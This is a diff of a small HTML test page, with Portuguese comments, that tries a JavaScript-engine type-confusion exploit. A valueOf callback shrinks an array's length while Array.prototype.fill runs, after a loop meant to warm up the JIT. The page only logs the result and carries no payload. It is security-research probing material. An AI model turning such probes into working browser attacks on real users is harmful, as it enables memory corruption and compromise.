@@ -2,55 +2,47 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Type Confusion via JIT</title>
+  <title>JIT Type Confusion Exploit</title>
   <style>
     body {
       background: black;
-      color: white;
+      color: lime;
       font-family: monospace;
-      padding: 20px;
-    }
-    #log {
-      white-space: pre-wrap;
     }
   </style>
 </head>
 <body>
-  <h1>JIT Type Confusion Test</h1>
-  <div id="log">Carregando gadget...</div>
-
+  <h1>JIT TypeConfusion Test</h1>
+  <pre id="log">Carregando...</pre>
   <script>
-    const logElement = document.getElementById("log");
-    let logs = "";
-
+    const logEl = document.getElementById("log");
     function log(msg) {
-      logs += msg + "\n";
-      logElement.textContent = logs;
+      logEl.textContent += msg + "\n";
     }
 
-    function runGadget() {
-      let arr = [1.1, 2.2, 3.3, 4.4];
-      let obj = {x: 1337};
+    function runExploit() {
+      log("Iniciando exploit com valueOf...");
 
-      function confuse(a, i) {
-        return a[i];
+      let arr = [1.1, 2.2, 3.3, 4.4];
+      let evil = { valueOf: () => {
+        arr.length = 1;
+        log("[Hijack] Length modificado via valueOf!");
+        return 3;
+      }};
+
+      // Esta operação será otimizada após algumas execuções
+      for (let i = 0; i < 10000; i++) {
+        [1, 2, 3].fill(0, 0, 3);
       }
 
-      for (let i = 0; i < 100000; i++) confuse(arr, 0); // aquece JIT
-
-      // Troca por objeto após JIT otimizar como "contendo doubles"
-      arr[0] = obj;
-
-      let res = confuse(arr, 0); // espera double, recebe objeto
-      log("[gadget-typeconf] Resultado: " + res);
-      log("[gadget-typeconf] typeof: " + typeof res);
+      // Aqui testamos se conseguimos burlar otimizações
+      let result = arr.fill(9.9, 0, evil);
+      log("[Resultado] " + result);
+      log("[Tipo] typeof result[1]: " + typeof result[1]);
+      log("Finalizado.");
     }
 
-    setTimeout(() => {
-      log("Iniciando gadget de Type Confusion via JIT...");
-      runGadget();
-      log("Finalizado.");
-    }, 1000);
+    setTimeout(runExploit, 1500);
   </script>
 </body>
 </html>
